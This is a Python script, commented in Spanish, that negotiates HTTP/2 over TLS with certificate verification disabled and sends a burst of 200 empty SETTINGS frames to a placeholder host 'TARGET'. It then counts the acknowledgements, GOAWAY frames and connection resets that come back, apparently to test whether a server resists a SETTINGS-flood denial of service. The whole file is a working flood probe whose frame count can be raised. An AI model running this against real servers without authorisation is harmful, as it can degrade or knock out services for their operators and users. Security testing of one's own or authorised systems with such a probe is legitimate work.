import socket, ssl, struct, time

HOST = "TARGET"
PORT = 443
N = 200  # cantidad de SETTINGS flood

FRAME_SETTINGS = 0x4
FRAME_WINDOW_UPDATE = 0x8
FRAME_GOAWAY = 0x7

def frame(ftype, flags, sid, payload=b""):
    ln = len(payload)
    h = struct.pack("!I", (ln << 8) | ftype)[1:] + bytes([flags]) + struct.pack("!I", sid & 0x7fffffff)
    return h + payload

def recv_frames(tls_sock, timeout_s=2.0, max_bytes=262144):
    buf = b""
    resets = 0
    tls_sock.settimeout(timeout_s)
    while len(buf) < max_bytes:
        try:
            data = tls_sock.recv(8192)
            if not data:
                break
            buf += data
        except ConnectionResetError:
            resets += 1
            break
        except socket.timeout:
            break
        except Exception:
            break
    return buf, resets

def count_h2_frames(raw):
    i = 0
    acks = 0
    goaway = 0
    settings = 0
    window_updates = 0
    while i + 9 <= len(raw):
        ln = (raw[i] << 16) | (raw[i + 1] << 8) | raw[i + 2]
        tp = raw[i + 3]
        fl = raw[i + 4]
        if i + 9 + ln > len(raw):
            break
        if tp == FRAME_SETTINGS:
            settings += 1
            if fl & 0x1:
                acks += 1
        elif tp == FRAME_GOAWAY:
            goaway += 1
        elif tp == FRAME_WINDOW_UPDATE:
            window_updates += 1
        i += 9 + ln
    return acks, goaway, settings, window_updates

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(["h2"])

s = socket.create_connection((HOST, PORT), timeout=10)
tls = ctx.wrap_socket(s, server_hostname=HOST)

print("ALPN:", tls.selected_alpn_protocol())  # debe ser h2
if tls.selected_alpn_protocol() != "h2":
    print("ERROR: no se negoció h2; abortando prueba.")
    tls.close()
    raise SystemExit(2)

tls.sendall(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
tls.sendall(frame(FRAME_SETTINGS, 0, 0, b""))  # SETTINGS inicial

# leer handshake inicial con ventana más amplia
pre, pre_resets = recv_frames(tls, timeout_s=2.5, max_bytes=65536)
pre_acks, pre_goaway, pre_settings, pre_win = count_h2_frames(pre)

burst = b"".join(frame(FRAME_SETTINGS, 0, 0, b"") for _ in range(N))
t0 = time.perf_counter()
tls.sendall(burst)
t1 = time.perf_counter()

# pausa mínima para permitir procesado de la ráfaga
time.sleep(0.2)

post, post_resets = recv_frames(tls, timeout_s=3.0, max_bytes=262144)
post_acks, post_goaway, post_settings, post_win = count_h2_frames(post)

total_acks = pre_acks + post_acks
total_goaway = pre_goaway + post_goaway
total_bytes = len(pre) + len(post)

print(f"Handshake bytes_rx: {len(pre)} | SETTINGS={pre_settings} | ACK={pre_acks} | WINDOW_UPDATE={pre_win} | GOAWAY={pre_goaway}")
print(f"Sent SETTINGS flood: {N} in {(t1 - t0) * 1000:.2f} ms")
print(f"Post-flood bytes_rx: {len(post)} | SETTINGS={post_settings} | ACK={post_acks} | WINDOW_UPDATE={post_win} | GOAWAY={post_goaway}")
print(f"TOTAL ACK: {total_acks} | TOTAL GOAWAY: {total_goaway} | TOTAL bytes_rx: {total_bytes} | TCP resets: {pre_resets + post_resets}")

if total_acks == 0 and total_goaway == 0 and (pre_resets + post_resets) > 0:
    print("OBS: cierre abrupto TCP sin GOAWAY parseable (evidencia de reacción no ordenada).")
elif total_acks > 0 and total_goaway == 0:
    print("OBS: servidor procesó SETTINGS y no emitió GOAWAY en la ventana de observación.")
elif total_goaway > 0:
    print("OBS: servidor emitió GOAWAY (posible mitigación o cierre por política).")
else:
    print("OBS: resultado inconcluso; repetir con N=50/200/500 y mayor ventana de lectura.")

tls.close()
